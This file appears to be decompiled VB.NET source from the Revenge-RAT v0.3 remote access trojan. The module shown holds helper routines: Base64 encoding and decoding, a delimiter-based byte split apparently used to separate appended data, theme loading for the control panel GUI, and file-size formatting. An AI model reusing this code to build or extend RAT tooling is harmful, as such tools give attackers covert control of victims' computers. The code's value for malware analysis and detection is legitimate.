Imports Microsoft.VisualBasic.CompilerServices
Imports System.IO
Imports System.Text
Imports System.Xml

Namespace RevengeRAT
    <StandardModule>
    Friend NotInheritable Class Functions
        ' Methods
        Public Shared Function BS(ByVal b As Byte()) As String
            Return Encoding.Default.GetString(b)
        End Function

        Public Shared Function DEB(ByRef s As String) As String
            Dim str2 As String
            Dim num As Integer = 0
Label_0004:
            Try
                Dim bytes As Byte() = Convert.FromBase64String(s)
                str2 = Encoding.UTF8.GetString(bytes)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                num += 1
                If (num = 3) Then
                    str2 = Nothing
                Else
                    s = (s & "=")
                    ProjectData.ClearProjectError()
                    GoTo Label_0004
                End If
                ProjectData.ClearProjectError()
            End Try
            Return str2
        End Function

        Public Shared Function ENB(ByRef s As String) As String
            Return Convert.ToBase64String(Encoding.UTF8.GetBytes(s))
        End Function

        Public Shared Function fx(ByVal b As Byte(), ByVal WRD As String) As Array
            Dim array As Array
            Try
                Dim list As New List(Of Byte())
                Dim stream As New MemoryStream
                Dim stream2 As New MemoryStream
                Dim strArray As String() = Strings.Split(Functions.BS(b), WRD, -1, CompareMethod.Binary)
                stream.Write(b, 0, strArray(0).Length)
                stream2.Write(b, (strArray(0).Length + WRD.Length), (b.Length - (strArray(0).Length + WRD.Length)))
                list.Add(stream.ToArray)
                list.Add(stream2.ToArray)
                stream.Dispose()
                stream2.Dispose()
                array = list.ToArray
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError()
            End Try
            Return array
        End Function

        Public Shared Function GCFH(ByVal Input As String) As Color
            Return VBHER.ColorFromHex(Functions.ThemeXML.DocumentElement.SelectSingleNode(Input).InnerText)
        End Function

        Public Shared Function GFH(ByVal Input As String) As Color
            Return ColorTranslator.FromHtml(Functions.ThemeXML.DocumentElement.SelectSingleNode(Input).InnerText)
        End Function

        Public Shared Function GTC(ByVal Input As String) As Color
            Dim strArray As String() = Strings.Split(Functions.ThemeXML.DocumentElement.SelectSingleNode(Input).InnerText, ",", -1, CompareMethod.Binary)
            Return Color.FromArgb(Conversions.ToInteger(strArray(0)), Conversions.ToInteger(strArray(1)), Conversions.ToInteger(strArray(2)))
        End Function

        Public Shared Function GTI(ByVal Name As String) As Object
            Dim obj2 As Object
            Try
                Dim num2 As Integer = (My.Forms.Main.ContextMenuStrip1.Items.Count - 1)
                Dim i As Integer = 0
                Do While (i <= num2)
                    Dim item As ToolStripItem = My.Forms.Main.ContextMenuStrip1.Items.Item(i)
                    If (item.Name = Name) Then
                        item.Visible = False
                        Return obj2
                    End If
                    i += 1
                Loop
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                MessageBox.Show(exception.Message.ToString, "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Hand)
                ProjectData.ClearProjectError()
            End Try
            Return obj2
        End Function

        Public Shared Function GUC(ByVal Input As String) As Color
            Return Color.FromName(Functions.ThemeXML.DocumentElement.SelectSingleNode(Input).InnerText)
        End Function

        Public Shared Function INTCC(ByVal A As Color, ByVal B As Color, ByVal C As Color, ByVal D As Color, ByVal F As Color, ByVal G As Color, ByVal H As Color, ByVal K As Color) As Object
            Dim obj2 As Object
            XylosTabControl.CCB = A
            XylosTabControl.Over = B
            XylosTabControl.CoverC = C
            XylosTabControl.Overtext = D
            XylosTabControl.HeaderColor = F
            XylosTabControl.MainColor = G
            XylosTabControl.SI1ST = H
            Return obj2
        End Function

        Public Shared Function INTT(ByVal H As Integer) As Object
            Dim obj2 As Object
            If (H = 0) Then
                Functions.ThemeXML.Load((Application.StartupPath & "\Themes\Default.XML"))
                Functions.INTCC(Functions.GCFH("A"), Functions.GCFH("B"), Functions.GCFH("C"), Functions.GCFH("D"), Functions.GCFH("F"), Functions.GCFH("G"), Functions.GTC("H"), Color.FromArgb(&H3E, &H41, &H48))
                Return obj2
            End If
            If (H = 1) Then
                Functions.ThemeXML.Load((Application.StartupPath & "\Themes\THE MYSTERIES LEGACY.XML"))
                Functions.INTCC(Functions.GTC("A"), Functions.GTC("B"), Functions.GTC("C"), Functions.GTC("D"), Functions.GTC("F"), Functions.GTC("G"), Functions.GTC("H"), Color.FromArgb(&H3E, &H41, &H48))
                Return obj2
            End If
            If (H = 2) Then
                Functions.ThemeXML.Load((Application.StartupPath & "\Themes\v_B01 - 3hud.XML"))
                Functions.INTCC(Functions.GTC("A"), Functions.GTC("B"), Functions.GTC("C"), Functions.GTC("D"), Functions.GTC("F"), Functions.GTC("G"), Functions.GTC("H"), Color.FromArgb(&H3E, &H41, &H48))
                Return obj2
            End If
            If (H = 3) Then
                Functions.ThemeXML.Load((Application.StartupPath & "\Themes\Tsunamii.XML"))
                Functions.INTCC(Functions.GTC("A"), Functions.GTC("B"), Functions.GTC("C"), Functions.GTC("D"), Functions.GTC("F"), Functions.GTC("G"), Functions.GTC("H"), Color.FromArgb(&H3E, &H41, &H48))
                Return obj2
            End If
            If (H = 4) Then
                Functions.ThemeXML.Load((Application.StartupPath & "\Themes\Dark Slate Blue.XML"))
                Functions.INTCC(Functions.GTC("A"), Functions.GTC("B"), Functions.GTC("C"), Functions.GTC("D"), Functions.GTC("F"), Functions.GTC("G"), Functions.GTC("H"), Color.FromArgb(&H3E, &H41, &H48))
                Return obj2
            End If
            If (H = 5) Then
                Functions.ThemeXML.Load((Application.StartupPath & "\Themes\Spring Green.XML"))
                Functions.INTCC(Functions.GTC("A"), Functions.GTC("B"), Functions.GTC("C"), Functions.GTC("D"), Functions.GTC("F"), Functions.GTC("G"), Functions.GTC("H"), Color.FromArgb(&H3E, &H41, &H48))
                Return obj2
            End If
            If (H = 6) Then
                Functions.ThemeXML.Load((Application.StartupPath & "\Themes\Steel Blue.XML"))
                Functions.INTCC(Functions.GTC("A"), Functions.GTC("B"), Functions.GTC("C"), Functions.GTC("D"), Functions.GTC("F"), Functions.GTC("G"), Functions.GTC("H"), Color.FromArgb(&H3E, &H41, &H48))
                Return obj2
            End If
            If (H = 7) Then
                Functions.ThemeXML.Load((Application.StartupPath & "\Themes\Teal.XML"))
                Functions.INTCC(Functions.GFH("A"), Functions.GTC("B"), Functions.GTC("C"), Functions.GTC("D"), Functions.GTC("F"), Functions.GTC("G"), Functions.GTC("H"), Color.FromArgb(&H3E, &H41, &H48))
                Return obj2
            End If
            If (H = 8) Then
                Functions.ThemeXML.Load((Application.StartupPath & "\Themes\Night Fury.XML"))
                Functions.INTCC(Functions.GFH("A"), Functions.GTC("B"), Functions.GTC("C"), Functions.GTC("D"), Functions.GTC("F"), Functions.GTC("G"), Functions.GTC("H"), Color.FromArgb(&H3E, &H41, &H48))
                Return obj2
            End If
            If (H = 9) Then
                Functions.ThemeXML.Load((Application.StartupPath & "\Themes\Light Sea Green.XML"))
                Functions.IUT(Functions.GUC("A"), Functions.GUC("B"), Functions.GUC("C"), Functions.GUC("D"), Functions.GUC("F"), Functions.GUC("G"), Functions.GUC("H"), Functions.GUC("K"))
                Return obj2
            End If
            If (H = 10) Then
                Functions.ThemeXML.Load((Application.StartupPath & "\Themes\Gray.XML"))
                Functions.INTCC(Functions.GTC("A"), Functions.GTC("B"), Functions.GTC("C"), Functions.GTC("D"), Functions.GTC("F"), Functions.GTC("G"), Functions.GTC("H"), Color.FromArgb(&H3E, &H41, &H48))
                Return obj2
            End If
            If (H = 11) Then
                Functions.ThemeXML.Load((Application.StartupPath & "\Themes\Ebony.XML"))
                Functions.INTCC(Functions.GTC("A"), Functions.GTC("B"), Functions.GTC("C"), Functions.GTC("D"), Functions.GTC("F"), Functions.GTC("G"), Functions.GTC("H"), Color.FromArgb(&H3E, &H41, &H48))
                Return obj2
            End If
            If (H = 12) Then
                Functions.ThemeXML.Load((Application.StartupPath & "\Themes\Darkness.XML"))
                Functions.INTCC(Functions.GTC("A"), Functions.GTC("B"), Functions.GTC("C"), Functions.GTC("D"), Functions.GTC("F"), Functions.GTC("G"), Functions.GTC("H"), Color.FromArgb(&H3E, &H41, &H48))
                Return obj2
            End If
            If (H = 13) Then
                Functions.ThemeXML.Load((Application.StartupPath & "\Themes\Corduroy.XML"))
                Functions.INTCC(Functions.GTC("A"), Functions.GTC("B"), Functions.GTC("C"), Functions.GTC("D"), Functions.GTC("F"), Functions.GTC("G"), Functions.GTC("H"), Color.FromArgb(&H3E, &H41, &H48))
                Return obj2
            End If
            If (H = 14) Then
                Functions.ThemeXML.Load((Application.StartupPath & "\Themes\Gondola.XML"))
                Functions.INTCC(Functions.GTC("A"), Functions.GTC("B"), Functions.GTC("C"), Functions.GTC("D"), Functions.GTC("F"), Functions.GTC("G"), Functions.GTC("H"), Color.FromArgb(&H3E, &H41, &H48))
                Return obj2
            End If
            If (H = 15) Then
                Functions.ThemeXML.Load((Application.StartupPath & "\Themes\Black Currant.XML"))
                Functions.INTCC(Functions.GTC("A"), Functions.GTC("B"), Functions.GTC("C"), Functions.GTC("D"), Functions.GTC("F"), Functions.GTC("G"), Functions.GTC("H"), Color.FromArgb(&H3E, &H41, &H48))
                Return obj2
            End If
            Try
                Functions.ThemeXML.Load((Application.StartupPath & "\Themes\" & My.Forms.Main.THN.Items.Item(My.Forms.Main.THN.SelectedIndex).ToString & ".XML"))
                Functions.IUT(Functions.GUC("A"), Functions.GUC("B"), Functions.GUC("C"), Functions.GUC("D"), Functions.GUC("F"), Functions.GUC("G"), Functions.GUC("H"), Functions.GUC("K"))
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Functions.ThemeXML.Load((Application.StartupPath & "\Themes\Default.XML"))
                Functions.INTCC(Functions.GTC("A"), Functions.GTC("B"), Functions.GTC("C"), Functions.GTC("D"), Functions.GTC("F"), Functions.GTC("G"), Functions.GTC("H"), Color.FromArgb(&H3E, &H41, &H48))
                ProjectData.ClearProjectError()
            End Try
            Return obj2
        End Function

        Public Shared Function IUT(ByVal A As Color, ByVal B As Color, ByVal C As Color, ByVal D As Color, ByVal F As Color, ByVal G As Color, ByVal H As Color, ByVal K As Color) As Object
            Dim obj2 As Object
            XylosTabControl.CCB = A
            XylosTabControl.Over = B
            XylosTabControl.SI1ST = C
            XylosTabControl.CoverC = F
            XylosTabControl.Overtext = G
            XylosTabControl.MainColor = H
            XylosTabControl.HeaderColor = K
            Return obj2
        End Function

        Public Shared Function SB(ByVal s As String) As Byte()
            Return Encoding.Default.GetBytes(s)
        End Function

        Public Shared Function siz(ByVal Size As String) As String
            Dim num As Integer
            If (Size.Length < 4) Then
                Return (Size & " Bytes")
            End If
            Dim str2 As String = Conversions.ToString(CDbl((Conversions.ToDouble(Size) / 1024)))
            Dim str As String = " KB"
            If (Strings.InStr(str2, ".", CompareMethod.Binary) > 0) Then
                Dim instance As Array = Strings.Split(str2, ".", -1, CompareMethod.Binary)
                str2 = Conversions.ToString(NewLateBinding.LateIndexGet(instance, New Object() {0}, Nothing))
                If (NewLateBinding.LateIndexGet(instance, New Object() {1}, Nothing).ToString.Length > 3) Then
                    num = Conversions.ToInteger(Strings.Mid(Conversions.ToString(NewLateBinding.LateIndexGet(instance, New Object() {1}, Nothing)), 1, 3))
                Else
                    num = Conversions.ToInteger(NewLateBinding.LateIndexGet(instance, New Object() {1}, Nothing))
                End If
            End If
            If (str2.Length > 3) Then
                str2 = Conversions.ToString(CDbl((Conversions.ToDouble(str2) / 1024)))
                str = " MB"
                If (Strings.InStr(str2, ".", CompareMethod.Binary) > 0) Then
                    Dim array2 As Array = Strings.Split(str2, ".", -1, CompareMethod.Binary)
                    str2 = Conversions.ToString(NewLateBinding.LateIndexGet(array2, New Object() {0}, Nothing))
                    If (NewLateBinding.LateIndexGet(array2, New Object() {1}, Nothing).ToString.Length > 3) Then
                        num = Conversions.ToInteger(Strings.Mid(Conversions.ToString(NewLateBinding.LateIndexGet(array2, New Object() {1}, Nothing)), 1, 3))
                    Else
                        num = Conversions.ToInteger(NewLateBinding.LateIndexGet(array2, New Object() {1}, Nothing))
                    End If
                End If
            End If
            If (str2.Length > 3) Then
                str2 = Conversions.ToString(CDbl((Conversions.ToDouble(str2) / 1024)))
                str = " GB"
                If (Strings.InStr(str2, ".", CompareMethod.Binary) > 0) Then
                    Dim array3 As Array = Strings.Split(str2, ".", -1, CompareMethod.Binary)
                    str2 = Conversions.ToString(NewLateBinding.LateIndexGet(array3, New Object() {0}, Nothing))
                    If (NewLateBinding.LateIndexGet(array3, New Object() {1}, Nothing).ToString.Length > 3) Then
                        num = Conversions.ToInteger(Strings.Mid(Conversions.ToString(NewLateBinding.LateIndexGet(array3, New Object() {1}, Nothing)), 1, 3))
                    Else
                        num = Conversions.ToInteger(NewLateBinding.LateIndexGet(array3, New Object() {1}, Nothing))
                    End If
                End If
            End If
            Return (str2 & "." & Conversions.ToString(num) & str)
        End Function


        ' Fields
        Public Shared ThemeXML As XmlDocument = New XmlDocument
    End Class
End Namespace


